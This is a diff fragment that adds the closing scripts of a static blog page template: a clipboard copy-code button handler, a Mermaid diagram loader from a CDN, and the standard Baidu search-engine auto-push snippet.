+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+
+
+<!-- CanvasBackground -->
+
+
+<script src="/js/dz.js"></script>
+
+
+<!-- mermaid -->
+
+  <script src='https://cdn.bootcdn.net/ajax/libs/mermaid/8.5.2/mermaid.min.js'></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({theme: 'forest'});
+    }
+  </script>
+
+<!-- baiduSpider auto push -->
+
+  <script>
+    (function(){
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https'){
+       bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else{
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+    </script>
+
+
+    
+  </div>
+</body>
+
+</html>
